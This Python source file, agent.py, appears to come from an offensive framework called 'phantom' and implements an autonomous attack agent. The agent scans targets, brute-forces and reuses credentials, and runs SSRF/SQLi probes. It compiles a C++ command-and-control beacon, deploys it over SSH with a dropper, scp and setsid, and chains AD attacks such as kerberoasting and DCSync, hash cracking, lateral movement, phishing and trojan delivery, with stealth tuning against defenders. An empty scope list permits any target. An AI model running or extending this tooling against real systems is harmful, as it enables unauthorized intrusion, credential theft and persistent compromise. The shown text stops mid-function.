"""
agent.py — the autonomous red-team agent.

run_autonomous() ties the whole stack together:

    target -> WorldModel -> Planner -> Orchestrator(pool) -> StealthRuntime
            -> capabilities (command knowledge model) -> perception
            -> findings back into WorldModel -> repeat until goal or
            "nothing new can make the next move work".

Termination rule: a failed capability stays dead unless NEW facts appear
that are useful for its preconditions (e.g. creds found after ssh_login
failed). No budgets, no infinite retries: stealth reasoning keeps the
agent quiet (one login try, not 200).

Every decision is streamed through on_event (for the live console), and
pause/stop keys are honored when interactive=True.
"""

from __future__ import annotations

import os
import random
import threading
import time
from typing import Any, Callable, Dict, List, Optional

from phantom.automation.belief import WorldModel, Finding
from phantom.automation.guidance.commands import Registry, make_registry
from phantom.automation.guidance.dynamics import DynCommandBuilder
from phantom.automation.guidance.stealth import StealthEngine, StealthConfig
from phantom.automation.guidance.threatmodel import BlueTeamModel
from phantom.automation.planner import Planner, Plan, PlanStep
from phantom.automation.reasoning import ReasoningEngine
from phantom.automation.enterprise import EnterpriseBrain
from phantom.automation.orchestrator import Orchestrator, PrioritizedAction, ActionStatus
from phantom.automation.runtime.stealth_runtime import StealthRuntime
from phantom.automation.runtime.toolchain import ToolRegistry
from phantom.automation.sandbox.sandbox import SandboxEngine, SandboxVerdict
from phantom.automation.social.engine import SocialEngine
from phantom.automation.fallback import FallbackEngine, HistoricalLearner
from phantom.automation.ad_awareness import ADAwareness
from phantom.core.executor import execute_quiet

# Deep mode: the goal string that runs the full engagement ladder back-to-
# back in ONE run instead of stopping at the first terminal goal. Each stage
# is a normal planner goal; a stage ends when its own goal facts exist (or
# no further move is viable — the planner halts fast on impossible stages,
# e.g. lateral with no peer host in scope), and the NEXT stage takes over:
#   deliver      -> beacon + persistence (the classic terminal)
#   post_exploit -> SYSTEM/root escalation + process injection (beacon ch.)
#   ad           -> domain enumeration + kerberoast/AS-REP/DCSync (dual ch.)
#   crack        -> crack the harvested hashes offline
#   lateral      -> pivot to in-scope peer hosts when any exist
DEEP_GOAL = "deep"
DEEP_STAGES = ("deliver", "post_exploit", "ad", "crack", "lateral")


def _in_scope(target: str, scope_list: List[str]) -> bool:
    """Scope enforcement: empty scope list = everything allowed."""
    if not scope_list:
        return True
    from phantom.core.scope import is_in_scope
    return is_in_scope(target, scope_list)


class ShareContext:
    """Cross-sub-agent shared knowledge inside a campaign.

    Credentials discovered by one sub-agent become immediately available
    to the others (reuse across the network), and the peer targets are the
    lateral-movement candidates. Thread-safe: sub-agents run concurrently.
    """

    def __init__(self, peers: Optional[List[str]] = None) -> None:
        self.peers: List[str] = list(peers or [])
        self._lock = threading.Lock()
        self._creds: List[tuple] = []  # (service, username, password, source)

    def add_creds(self, service: str, username: str, password: str,
                  source_target: str) -> None:
        entry = (service, username, password, source_target)
        with self._lock:
            for c in self._creds:
                if c[:3] == entry[:3]:
                    return
            self._creds.append(entry)

    def find(self, service: Optional[str] = None) -> Optional[tuple]:
        """First matching credential pair (any service if service is None)."""
        with self._lock:
            for c in self._creds:
                if service is None or c[0] == service:
                    return (c[1], c[2])
        return None

    def first_peer(self, exclude: Optional[str] = None) -> Optional[str]:
        for p in self.peers:
            if p != exclude:
                return p
        return None


# ---------------------------------------------------------------------------
# event stream
# ---------------------------------------------------------------------------

class EventSink:
    """Collector of decision events (console stream / tests)."""

    def __init__(self) -> None:
        self.events: List[Dict[str, Any]] = []

    def emit(self, kind: str, **data) -> None:
        self.events.append({"kind": kind, **data})

    def by_kind(self, kind: str) -> List[Dict[str, Any]]:
        return [e for e in self.events if e["kind"] == kind]


# ---------------------------------------------------------------------------
# beacon channel
# ---------------------------------------------------------------------------

class _BeaconSession:
    """A session over OUR C2 stack for one registered C++ beacon.

    Post-exploitation is queued as C2 tasks and the output is collected
    from the C2 state — the exact same channel the C2 shell uses. This is
    the ONLY path for post-exploitation: commands run inside the beacon,
    never from a wrapper listener.
    """

    def __init__(self, beacon_id: str) -> None:
        self.beacon_id = beacon_id

    def task(self, command: str) -> Optional[str]:
        from phantom.core.c2_server import c2_state
        try:
            return c2_state.queue_task(self.beacon_id, command)
        except Exception:
            return None

    def wait_result(self, task_id: str, timeout: float = 30.0) -> Optional[str]:
        from phantom.core.c2_server import c2_state
        deadline = time.time() + timeout
        while time.time() < deadline:
            for r in c2_state.get_results(self.beacon_id):
                if r.get("task_id") == task_id:
                    return r.get("output", "")
            time.sleep(0.1)
        return None


# ---------------------------------------------------------------------------
# agent
# ---------------------------------------------------------------------------

class AutonomousAgent:
    """Runs a goal-directed kill chain against one target."""

    def __init__(self, target: str, target_type: str = "auto",
                 profile: str = "enterprise", aggressive: bool = False,
                 stealth: bool = True,
                 paranoid: bool = False,
                 speed: bool = False,
                 on_event: Optional[Callable[[str, dict]]] = None,
                 registry: Optional[Registry] = None,
                 runtime: Optional[StealthRuntime] = None,
                 sandbox: Optional[SandboxEngine] = None,
                 cred_discoverer: Optional[Callable[[str], Optional[tuple]]] = None,
                 scope_list: Optional[List[str]] = None,
                 toolchain: Optional[ToolRegistry] = None,
                 share: Optional[ShareContext] = None,
                 beacon_builder: Optional[Callable[[str, str, int], Optional[str]]] = None,
                 social_engine: Optional[Any] = None,
                 trojan_assets: Optional[Dict[str, str]] = None,
                 command_seed: int = 0,
                 shared_wm: Optional["WorldModel"] = None,
                 hunt_runner: Optional[Callable[[str, str, str, float], Any]] = None,
                 hunt_delay: Optional[float] = None,
                 threat_intel=None,
                 persist_learning: bool = False,
                 llm: bool = False) -> None:
        self.target = target
        if target_type in ("", "auto"):
            from phantom.automation.guidance.targets import classify_target
            target_type = classify_target(target)
        self.target_type = target_type
        self.profile = profile
        self.aggressive = aggressive
        self.stealth = stealth
        self.paranoid = paranoid
        self.speed = speed
        self.scope_list = scope_list or []

        self.wm = (shared_wm if shared_wm is not None
                   else WorldModel(target=target, target_type=target_type))
        # port-scan coverage per run profile: default and stealth sweep the
        # full range up front (non-standard services like SSH-on-2222 are
        # visible immediately); speed and aggressive keep the fast top-ports
        # (deep scan is still escalated by _recover_stall if no access
        # service appears). Read by the scan adapters in guidance/kit.py.
        if aggressive:
            self.wm.scan_style = "top_loud"      # fast + noisy, top ports
        elif speed:
            self.wm.scan_style = "top_fast"      # fast, top ports
        elif paranoid:
            self.wm.scan_style = "full_stealth"  # full range, slow timing
        else:
            self.wm.scan_style = "full"          # full range, standard
        self.blue_team = BlueTeamModel.for_profile(profile)
        config = StealthConfig(aggressive=aggressive, paranoid=paranoid,
                               speed=speed, profile=profile)
        self.stealth_engine = StealthEngine(self.wm, config, self.blue_team)
        self.registry = registry or make_registry()
        self.planner = Planner(self.registry, self.stealth_engine)
        self.reasoning = ReasoningEngine(self.registry, paranoid=paranoid)
        self.enterprise = EnterpriseBrain(profile, threat_intel=threat_intel)
        self.persist_learning = persist_learning
        self.runtime = runtime or StealthRuntime(self.stealth_engine)
        self.sandbox = sandbox if sandbox is not None else SandboxEngine()
        self.toolchain = toolchain if toolchain is not None else ToolRegistry()
        self.share = share if share is not None else ShareContext(peers=[])
        self._cred_discoverer = cred_discoverer or self._default_cred_discovery
        self._failed_caps: Dict[str, float] = {}  # capability -> failure ts
        self._last_fail_reason: Dict[str, str] = {}  # capability -> last failure reason
        # consecutive-identical-failure poisoning: a move that fails the same
        # way three times is a deterministic dead end for THIS target. It is
        # dropped from planning and recovery so the agent falls through to
        # the next beacon source (e.g. web_creds -> web_rce) instead of
        # spinning forever.
        self._fail_notes: Dict[tuple, int] = {}
        self._poisoned: set = set()
        self._recoveries = 0
        self._max_recoveries = 3
        self._session: Optional["_BeaconSession"] = None
        self._beacon_builder = beacon_builder or self._default_beacon_builder
        self.social_engine = social_engine if social_engine is not None else SocialEngine()
        self._trojan_assets = trojan_assets or {}
        self._fallback: Any = None
        self._history: Any = None
        self._ad_checked: bool = False

        # v3.0: load historical self-learning if persist_learning is on
        if persist_learning:
            from phantom.automation.fallback import init_historical_learner
            self._history = init_historical_learner()
            self._fallback = FallbackEngine(history=self._history)
        else:
            self._fallback = FallbackEngine()
        self._dyn = DynCommandBuilder(seed=command_seed)
        self.hunt_runner = hunt_runner
        self.hunt_delay = hunt_delay
        self.sink = EventSink()
        self._on_event = on_event
        # optional local-LLM advisor: non-gating, injection-hardened
        from phantom.automation.llm_advisor import LLMAdvisor
        self.llm_advisor = LLMAdvisor(enabled=llm, paranoid=paranoid)
        self.goal: Optional[str] = None
        self.result: Dict[str, Any] = {}
        self._stage_outcomes: Dict[str, bool] = {}

    # ------------------------------------------------------------- plumbing

    def _scope_ok(self) -> bool:
        """Scope discipline. Identity targets (email/username/phone) are the
        engagement SUBJECT and are always in scope: the scope list gates the
        MACHINES (ip/domain/url) and the harvested victim_ip — which is the
        same person's asset by design, so the identity chain can converge on
        it. An empty scope list allows everything (documented default)."""
        if not self.scope_list:
            return True
        from phantom.automation.guidance.targets import is_identity_target
        if is_identity_target(self.target_type):
            return True
        return _in_scope(self.target, self.scope_list)

    def _emit(self, kind: str, **data) -> None:
        self.sink.emit(kind, **data)
        if self._on_event:
            try:
                self._on_event(kind, data)
            except Exception:
                pass

    # ------------------------------------------------- noise accounting

    def _account_noise(self, cap) -> None:
        """Feed the noise circuit breaker before a loud move executes.
        Categories map to breaker events; the WorldModel persists the score
        so resumed runs remember how loud the engagement already was."""
        try:
            if cap.category == "brute":
                self.wm.record_noise("brute_online")
            elif cap.category == "scan" and cap.stealth_level == "aggressive":
                self.wm.record_noise("loud_scan")
            elif cap.category == "ad":
                self.wm.record_noise("ad_attack")
            elif cap.category in ("exploit", "hunt"):
                self.wm.record_noise("exploit")
        except Exception:
            pass

    def _execute_capability(self, step: PlanStep) -> bool:
        cap = step.capability
        slots = dict(step.slot_values)
        # scope discipline: never act on a target that is out of authorized scope
        if not self._scope_ok():
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason=f"target {self.target} out of scope")
            self.wm.record_failure(cap.id, f"out of scope: {self.target}")
            return False
        # the world is the judge: a capability whose preconditions are not
        # met NOW is deferred, not executed (e.g. network tooling on an
        # identity target before the victim_ip was harvested). Deferral is
        # NOT a failure: the run loop resubmits the step once new facts
        # satisfy its preconditions. post capabilities are exempt: they
        # carry their own precise gates ("requires SYSTEM privileges
        # first", "no beacon session", ...)
        if cap.category != "post":
            for pre in cap.preconditions:
                try:
                    if not pre(self.wm):
                        self._emit("deferred", capability=cap.id,
                                   reason="precondition not met")
                        return False
                except Exception:
                    pass
        # toolchain: a capability whose tools are missing fails cleanly
        # (checked BEFORE autofill so no side effects are recorded)
        if cap.tools:
            missing = self.toolchain.missing(cap.tools)
            if missing:
                self._mark_failed(cap.id)
                self._emit("tool_missing", capability=cap.id, tools=missing)
                self.wm.record_failure(cap.id, f"tool unavailable: {', '.join(missing)}")
                return False
        # senior red-teamer behavior: fill in what the plan didn't specify
        try:
            slots = self._autofill_slots(cap, slots)
        except Exception as e:
            self._mark_failed(cap.id)
            self._emit("error", capability=cap.id, detail=f"autofill: {e}")
            return False
        # post-exploitation capabilities execute through the beacon channel
        if cap.category == "post":
            return self._execute_post_capability(cap, slots)
        # AD capabilities are DUAL-channel: through the beacon session when
        # one exists, DIRECTLY from the operator box when it does not — a
        # domain controller can be enumerated/kerberoasted with just
        # network access + credentials, no beacon foothold required.
        if cap.category == "ad":
            return self._execute_ad_capability(cap, slots)
        # social/osint capabilities execute through the SocialEngine channel
        # (OSINT discovery, breach lookup, persona, phish, IP-grabber polling)
        if cap.category in ("osint", "social"):
            return self._execute_social_capability(cap, slots)
        # behavioural hunting executes through the anomaly engine channel
        # (baseline + statistical scoring + mutation escalation, in-process)
        if cap.category == "hunt":
            return self._execute_hunt_capability(cap, slots)
        # web credential extraction is an in-process engine (SSRF/SQLi
        # probes against the discovered web services) — the adapter returns
        # WEBCREDS: markers, never a shell command
        if cap.id == "web_creds":
            return self._execute_web_creds_capability(cap, slots)
        # synthesize the command — the ONLY place commands exist
        try:
            cmd = cap.make_command(self.wm, slots)
        except ValueError as e:
            self._mark_failed(cap.id)
            self._emit("error", capability=cap.id, detail=str(e))
            return False
        # per-run dynamic shaping: never ship a static command, vary the
        # ephemeral staging path so consecutive runs differ on the endpoint
        cmd = self._dyn.shape(cmd, self.wm)
        # senior discipline: never deploy a beacon without a foothold.
        # If the access path (creds) failed earlier, this stays blocked
        # until NEW facts (e.g. creds from another vector) make it viable.
        if cap.id == "beacon_deploy" and not self.wm.find("creds", valid=True):
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="no foothold: valid creds required before beacon deploy")
            return False
        # beacon_deploy must run ON the target, not on the operator box:
        # the dropper downloads the staged binary from our C2 and executes
        # it there. Wrap it in an SSH remote-exec with the validated creds
        # and the discovered SSH port.
        if cap.id == "beacon_deploy":
            try:
                cmd = self._wrap_remote_exec(cmd)
            except ValueError as e:
                self._mark_failed(cap.id)
                self._emit("blocked", capability=cap.id, reason=str(e))
                return False
        # sandbox gate for payload/beacon capabilities: the payload is
        # materialized to disk and scanned by every available backend.
        # Only materialized samples are pre-flighted — exploit *commands*
        # against the target are not local samples and carry no scan gate.
        if cap.id == "beacon_deploy":
            sample_path = self._deploy_sample_path()
            if not sample_path:
                self._mark_failed(cap.id)
                self._emit("blocked", capability=cap.id,
                           reason="beacon binary missing (build produced no file)")
                return False
            verdict = self._preflight(cap.id, sample_path)
            if not verdict.approved and not self.aggressive:
                self._mark_failed(cap.id)
                self._emit("blocked", capability=cap.id,
                           reason=verdict.summary())
                return False
        self._emit("run", capability=cap.id, banner=cap.banner,
                   category=cap.category, cost=cap.opsec_cost)
        # noise circuit breaker: account the detection risk of loud moves
        self._account_noise(cap)
        # stealth-aware execution (human timing + opsec spend + egress)
        # v3.0: AD awareness — check for domain environment after first scan
        if not self._ad_checked and cap.id in ("scan_tcp", "version_detect"):
            try:
                from phantom.automation.ad_awareness import assess_active_directory
                services = self.wm.find("service")
                ports = []
                for f in services:
                    try:
                        pk = str(f.key).split("/")[-1] if "/" in str(f.key) else str(f.key)
                        ports.append(int(pk))
                    except (ValueError, TypeError):
                        pass
                if ports:
                    assess_active_directory(self.wm, self.target, ports)
                    self._ad_checked = True
                    if self.wm.has_any("ad_domain"):
                        self._emit("found", capability="ad_awareness",
                                   findings=["ad_domain"])
            except Exception:
                pass
        run = self.runtime.run(cmd, category=cap.category,
                               stealth_level=cap.stealth_level,
                               agent="agent-1", timeout=cap.timeout)
        self.wm.record_action(cap.id, slots, cmd, ok=run.ok,
                              opsec=self.runtime.cost_per_action)
        if not run.ok:
            # timeout salvage: a killed long scan often still holds minutes
            # of completed work (an 85%-done full sweep knows most of the
            # open ports). Salvage the output through perception first; if
            # it yields findings, count the run as success instead of
            # burning the whole wave as a failure (which pushed the agent
            # into its retry loop).
            salvaged = cap.interpret(run.output or "", self.wm, slots) \
                if (run.output and getattr(run, "timed_out", False)) else []
            if salvaged:
                learned = self._register_findings(cap.id, salvaged)
                self._emit("found", capability=cap.id,
                           findings=[f"{f.kind}:{f.key}" for f in salvaged],
                           values={f"{f.kind}:{f.key}": (
                               ", ".join(str(x) for x in list(f.value.values())[:3])
                               if isinstance(f.value, dict) else str(f.value))
                               for f in salvaged},
                           partial=True)
                self.wm.record_action(cap.id, slots, cmd, ok=True,
                                      opsec=self.runtime.cost_per_action)
                return True
            self.wm.record_failure(cap.id, run.output or "execution failed")
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id, output=run.output[:300])
            # v3.0: record fallback for smarter next-strategy decisions
            self._fallback.record(
                cap.category, cap.id, self.target, ok=False,
                reason=run.output[:200] if run.output else "execution failed",
                elapsed=run.elapsed if hasattr(run, "elapsed") else 0.0,
            )
            return False
        # perception: output -> findings
        findings = cap.interpret(run.output, self.wm, slots)
        learned = self._register_findings(cap.id, findings)
        # beacon capability → verify the compiled C++ beacon checked in
        # to our C2 (registration matched by source IP == target). This
        # covers BOTH channels: creds-based deploy AND the RCE bridge.
        if cap.id in ("beacon_deploy", "beacon_via_rce"):
            beacon_id = self._await_beacon()
            if beacon_id:
                self.wm.add_finding(
                    "beacon", "established",
                    {"target": self.target,
                     "payload": slots.get("command", ""),
                     "channel": "creds" if cap.id == "beacon_deploy" else "rce"},
                    confidence=0.95, source="c2_registration")
                self._emit("beacon_up", beacon_id=beacon_id)
                self._session = _BeaconSession(beacon_id)
                return True
            self.wm.record_failure(cap.id, "no beacon check-in received")
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id,
                       output="no beacon check-in received")
            return False
        if findings:
            self._emit("found", capability=cap.id,
                       findings=[f"{f.kind}:{f.key}" for f in findings],
                       values={f"{f.kind}:{f.key}": (
                           ", ".join(str(x) for x in list(f.value.values())[:3])
                           if isinstance(f.value, dict) else str(f.value))
                           for f in findings})
        # v3.0: record success for fallback/learning engine
        self._fallback.record(
            cap.category, cap.id, self.target, ok=True,
            elapsed=run.elapsed if hasattr(run, "elapsed") else 0.0,
        )
        if not learned:
            # ran cleanly but learned nothing new: the move is spent until
            # new facts make it viable again (no infinite re-runs). Tell the
            # operator WHY the run produced no facts (e.g. "Too many
            # fingerprints match this host" on OS detect) instead of an
            # empty success line.
            note = (self._output_reason(run.output or "") if not findings
                    else "no NEW findings (already known)")
            self._emit("note", capability=cap.id, detail=note)
            self._mark_failed(cap.id)
            self.wm.record_failure(cap.id, "no new facts learned")
            return False
        return True

    def _register_findings(self, cap_id: str, findings) -> bool:
        """Store interpreted findings; True if any was actually NEW.

        A run that re-produces only already-known facts learned nothing:
        the capability is spent (like the "no findings" case) so the
        planner moves on to the next source instead of looping forever
        (e.g. breach_check re-running while its invalid creds never open
        the beacon gate).
        """
        known = {(f.kind, f.key): f for f in self.wm.all_findings()}
        new = False
        for f in findings:
            prev = known.get((f.kind, f.key))
            if prev is None or prev.value != f.value:
                new = True
            self.wm.add_finding(f.kind, f.key, f.value,
                                confidence=f.confidence, source=cap_id,
                                evidence=f.evidence)
        return new

    # ------------------------------------------------- retry discipline

    _OUTPUT_REASON_PATTERNS = (
        ("Too many fingerprints match this host",
         "OS fingerprint ambiguous: nmap found too many matching fingerprints"),
        ("no exact OS matches",
         "OS fingerprint: no exact match in the database"),
        ("all .* scanned ports.*are in ignored states",
         "all probed ports filtered/ignored — host is firewalled"),
        ("host seems down", "host does not respond to probes"),
        ("0 hosts up", "no live hosts found"),
        ("no open ports", "no open ports detected"),
    )

    def _output_reason(self, output: str) -> str:
        """Short human reason extracted from a clean-but-empty tool output,
        so the operator sees WHY a run produced no facts (the empty
        `[+] os_detect:` line was indistinguishable from a real success)."""
        if not output:
            return "ran clean but produced no findings"
        import re as _re
        head = output[:3000]
        for pat, msg in self._OUTPUT_REASON_PATTERNS:
            if _re.search(pat, head, _re.IGNORECASE):
                return msg
        # generic: take the last meaningful non-decorative line
        lines = [ln.strip() for ln in output.splitlines() if ln.strip()
                 and not ln.strip().startswith(("Starting ", "Nmap done",
                                                "Not shown", "MAC Address"))]
        if lines:
            return lines[-1][:120]
        return "ran clean but produced no findings"

    def _mark_failed(self, capability_id: str) -> None:
        """A capability is dead from now on — unless the world changes."""
        self._failed_caps[capability_id] = time.time()
        note = ""
        for f in reversed(self.wm.failures):
            if f.get("capability") == capability_id:
                note = f.get("reason", "")
                break
        self._last_fail_reason[capability_id] = note
        key = (capability_id, note)
        count = self._fail_notes.get(key, 0) + 1
        self._fail_notes[key] = count
        if count >= 3:
            self._poisoned.add(capability_id)

    def _retry_eligible(self, cap) -> bool:
        """A failed move is NEVER retried blindly.

        It only becomes viable again if NEW findings arrived that are useful
        for its preconditions (e.g. ssh_login failed with no creds; a brute
        later found creds → retry ssh_login). Self-sufficient capabilities
        (no preconditions) stay dead forever.

        Spent-effect guard: a capability whose effect facts ALREADY exist in
        the world is never retried — its output is deterministic given the
        same inputs, so re-running can only re-produce known facts. This is
        what killed the observed loop (scan → version_detect adds service
        facts → http_probe/scan_tcp re-armed by the refreshed preconditions
        → same web_header again → failed → re-armed …).

        Failure memory: the same capability failing with the SAME reason on
        the same target twice is treated as a deterministic dead end (the
        third attempt is suppressed even though _poisoned waits for 3) —
        two identical failures already prove the approach doesn't work
        with the current facts.
        """
        failed_at = self._failed_caps.get(cap.id)
        if failed_at is None:
            return True
        # spent-effect guard: the world already holds what this move produces
        if cap.effects and all(self.wm.has_any(e) for e in cap.effects):
            return False
        # identical-failure memory (evidence-based, not blind counting)
        same_failures = 0
        for f in reversed(self.wm.failures):
            if f.get("capability") == cap.id:
                if f.get("reason") == self._last_fail_reason.get(cap.id):
                    same_failures += 1
                if same_failures >= 2:
                    return False
                break
        fact_kinds: set = set()
        for pre in cap.preconditions:
            fact_kinds.update(Planner._precondition_facts(pre))
        if not fact_kinds:
            return False
        return any(f.ts > failed_at for kind in fact_kinds
                   for f in self.wm.find(kind))

    def _autofill_slots(self, cap, slots: Dict[str, Any]) -> Dict[str, Any]:
        """Senior behavior: supply what the plan left unspecified.

        * creds capabilities (ssh_login ...) → run OfflineBrute with the
          matching verifier; first valid pair becomes the slot values and a
          creds finding.
        * beacon_deploy → build the dropper for our OWN compiled C++ beacon
          (platform from the OS finding); the beacon itself checks in to
          our C2 and post-exploitation runs through that channel.
        """
        if cap.id in ("lateral_pivot", "smb_pivot", "winrm_pivot") \
                and "host" not in slots:
            # host is an OPTIONAL input (peers may be absent) — still
            # autofill it from the campaign share when available
            peer = self.share.first_peer(self.target)
            if peer:
                slots["host"] = peer

        required = {s.name for s in cap.inputs if s.required}
        missing = required - set(slots)
        if cap.id == "trojan_deliver" and "carrier" not in slots \
                and "payload" not in slots and self._trojan_assets:
            carrier = self._trojan_assets.get("carrier")
            payload = self._trojan_assets.get("payload")
            if carrier and payload:
                slots["carrier"] = carrier
                slots["payload"] = payload
                if self._trojan_assets.get("staging"):
                    slots["staging"] = self._trojan_assets["staging"]
        if not missing:
            return slots

        if "username" in missing and "password" in missing and "port" not in missing:
            service = "ssh" if cap.id.startswith("ssh_") else cap.id.replace("_login", "")
            if cap.id in ("lateral_pivot", "privesc_sudo"):
                service = "ssh"  # the session credentials drive the pivot/sudo
            elif cap.id == "smb_pivot":
                service = "smb"
            elif cap.id == "winrm_pivot":
                service = "winrm"
            elif cap.id in ("kerberoast", "as_rep_roast", "dc_sync"):
                service = "domain"
            found = self._discover_credentials(service)
            if found:
                slots["username"], slots["password"] = found
                # only record a NEW credential fact: re-discovering the same
                # pair must NOT refresh the finding timestamp, otherwise it
                # re-arms other failed pivot capabilities via _retry_eligible
                # and starves the fallback chain (lateral/smb/winrm).
                key = f"{service}:{found[0]}"
                prev = self.wm.get("creds", key)
                if prev is None or prev.value.get("password") != found[1]:
                    self.wm.add_finding(
                        "creds", key,
                        {"username": found[0], "password": found[1],
                         "valid": True, "service": service},
                        confidence=0.8, source=f"offline_brute_{service}")
        elif "command" in missing and cap.id in ("beacon_deploy",
                                                  "beacon_via_rce"):
            slots["command"] = self._build_payload()
        return slots

    def _discover_credentials(self, service: str):
        # campaign knowledge first: creds found by OTHER sub-agents are
        # immediately reusable (lateral movement / domain reuse)
        if self.share:
            shared = self.share.find(service)
            if shared is None and service != "ssh":
                shared = self.share.find(None)  # any-service fallback
            if shared:
                return shared
        # reuse credentials THIS agent already validated on another service:
        # an SSH/SMB foothold user is very often the same account that powers
        # the domain kill chain (kerberoast / as_rep / dc_sync) or the
        # lateral pivot. There is no offline "domain" verifier, so without
        # this the AD capabilities could never be autofilled in a single-
        # target run — the WorldModel is their primary credential source.
        found = self._wm_credentials(service)
        if found:
            return found
        found = self._cred_discoverer(service)
        if found and self.share:
            self.share.add_creds(service, found[0], found[1], self.target)
        return found

    def _wm_credentials(self, service: str):
        """A VALIDATED credential pair already in the WorldModel, preferring
        the requested service then any service as a fallback."""
        creds = self.wm.find("creds", valid=True)
        if not creds:
            return None
        fallback = None
        for f in creds:
            v = f.value if isinstance(f.value, dict) else {}
            user, pw = v.get("username"), v.get("password")
            if not user or not pw:
                continue
            pair = (str(user), str(pw))
            if v.get("service") == service:
                return pair
            if fallback is None:
                fallback = pair
        return fallback

    def _default_cred_discovery(self, service: str):
        from phantom.automation.exploit.vectors import OfflineBrute, _builtin_verifiers
        verifier = _builtin_verifiers().get(service)
        if not verifier:
            return None
        brute = OfflineBrute(verifier)
        port = self._service_port(service)
        res = brute.run(self.target, port, service)
        return res.credentials

    def _service_port(self, service: str) -> int:
        """Prefer the port the scanner actually discovered for this service
        (SSH on 2222, tomcat on 8081, ...); fall back to the well-known port."""
        for finding in self.wm.find("service"):
            value = finding.value if isinstance(finding.value, dict) else {}
            if str(value.get("service", "")).lower() == service:
                try:
                    return int(value.get("port"))
                except (TypeError, ValueError):
                    pass
        return {"ssh": 22, "smb": 445, "ftp": 21, "winrm": 5985,
                "http": 80, "tomcat": 8080, "mysql": 3306,
                "postgresql": 5432}.get(service, 443)
    def _target_platform(self) -> str:
        """Platform comes from the OS finding (like the manual `generate`
        flow picks the dropper). Default: linux — the beacon for the target
        OS is compiled on demand by the SAME builder the C2 shell uses."""
        from phantom.automation.guidance.kit import _target_os as _target_os_name
        os_name = _target_os_name(self.wm).lower()
        if "windows" in os_name or "win" in os_name:
            return "windows"
        return "linux"

    def _default_beacon_builder(self, platform: str, c2_host: str,
                                c2_port: int) -> Optional[str]:
        """Compile our OWN C++ beacon for the target platform on demand
        (compile-on-demand, exactly like `generate` from the C2 shell).
        Returns the binary path, or None when the toolchain is missing."""
        try:
            import phantom
            from phantom.utils.builder import compile_beacon
            from phantom.utils.c2_crypto import write_beacon_c2_config
            beacon_dir = os.path.join(os.path.dirname(phantom.__file__),
                                      "payloads", "beacon")
            # the binary embeds C2 host/port at build time — force a rebuild
            # when the requested C2 endpoint changed since the last build
            import hashlib
            cfg_path = os.path.join(beacon_dir, "src", "c2_config.h")
            current = ""
            if os.path.exists(cfg_path):
                with open(cfg_path, "r", encoding="utf-8") as f:
                    current = f.read()
            desired = write_beacon_c2_config(
                beacon_dir, host=c2_host, port=c2_port, use_ssl=True)
            force = (desired != current)
            return compile_beacon(
                platform, os.path.dirname(phantom.__file__),
                force_rebuild=force, arch="x64",
                host=c2_host, port=c2_port, use_ssl=True)
        except Exception:
            return None

    def _build_payload(self) -> str:
        """The deploy command ships PHANTOM's own C++ beacon — never
        third-party payloads. The dropper (chosen by the target OS finding)
        stages the compiled binary from our C2 listener and executes it; the
        beacon then checks in to our OWN C2 and all post-exploitation runs
        through that channel."""
        from phantom.utils.network import get_c2_endpoint
        c2_host, c2_port = get_c2_endpoint()
        platform = self._target_platform()
        binary = self._beacon_builder(platform, c2_host, c2_port)
        if not binary:
            raise ValueError(
                f"beacon build failed for platform {platform} "
                "(toolchain missing on the operator host?)")
        self._last_beacon_binary = binary
        from phantom.utils.builder import generate_dropper
        dropper = generate_dropper(platform, c2_host, c2_port, use_ssl=True)
        if not dropper:
            raise ValueError(f"no dropper defined for platform {platform}")
        return dropper

    def _ssh_creds_ok(self, user: str, pw: str) -> bool:
        """Quick probe: does this (user, pw) pair actually open an SSH
        session on the target? Many found creds are web-only (an admin
        account on the app that has no shell). Probing avoids burning the
        beacon deploy on a pair that can never connect.

        Runs through the SAME runner the agent uses (so tests with a fake
        runner keep working): a real sshpass+ssh 'id' against the target."""
        try:
            from phantom.automation.guidance.kit import _effective_target
            port = self._service_port("ssh")
            target = _effective_target(self.wm)
            opts = "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null " \
                   "-o ConnectTimeout=6 -o BatchMode=no"
            cmd = (f"sshpass -p {pw} ssh -p {port} {opts} "
                   f"{user}@{target} 'id' 2>/dev/null")
            if self.runtime is not None:
                res = self.runtime.runner(cmd, timeout=12)
            else:
                from phantom.core.executor import execute_quiet
                res = execute_quiet(cmd, timeout=12)
            return bool(getattr(res, "ok", False)) and (
                "uid=" in (getattr(res, "stdout", "") or "")
                or "id=" in (getattr(res, "stdout", "") or ""))
        except Exception:
            return False

    def _wrap_remote_exec(self, command: str) -> str:
        """Deploy the beacon ON the target via SSH (scp + setsid).

        The dropper command alone must never run on the operator box, and a
        curl-dropper executed through a remote ssh one-liner dies of SIGHUP
        the moment ssh closes (the download is never finished). The reliable
        path is the one proven in the lab: scp the compiled binary to the
        target, then launch it detached with setsid so it survives the ssh
        session ending. Uses the validated creds finding and the SSH port
        the scanner discovered.
        """
        platform = self._target_platform()
        if platform != "linux":
            raise ValueError(
                f"auto-mode beacon deploy over SSH supports linux targets "
                f"(got {platform}); use the RCE bridge for other platforms")
        creds = self.wm.find("creds", valid=True)
        if not creds:
            raise ValueError("beacon deploy requires a valid creds finding")
        # the FIRST cred may be a web-only account (admin on the app, no
        # SSH). Chain through every validated pair until one actually opens
        # an SSH session — the beacon deploy runs the first that connects.
        creds = sorted(creds, key=lambda f: (
            1 if str((f.value if isinstance(f.value, dict) else {}).get(
                "service", "")) == "ssh" else 0,
            f.ts if hasattr(f, "ts") else 0.0))
        user = pw = None
        for f in creds:
            c = f.value if isinstance(f.value, dict) else {}
            u, p = c.get("username"), c.get("password")
            if not u or not p:
                continue
            if self._ssh_creds_ok(u, p):
                user, pw = u, p
                break
        if not user or not pw:
            raise ValueError(
                "beacon deploy: no valid SSH credential pair "
                "(web-app creds do not grant shell access)")
        from phantom.automation.guidance.kit import _effective_target
        binary = getattr(self, "_last_beacon_binary", "")
        if not binary or not os.path.exists(binary):
            raise ValueError("beacon binary missing (build did not produce a file)")
        # prefer the STATIC linux build for deployment: the dynamic binary
        # requires a glibc >= 2.38 (Kali), while most targets (Debian
        # bookworm, Ubuntu 22.04 ...) ship 2.34-2.36 and the beacon would
        # die on startup.
        static = os.path.join(os.path.dirname(binary), "beacon_linux_static")
        if os.path.exists(static):
            binary = static
        port = self._service_port("ssh")
        target = _effective_target(self.wm)
        from phantom.utils.network import get_c2_endpoint
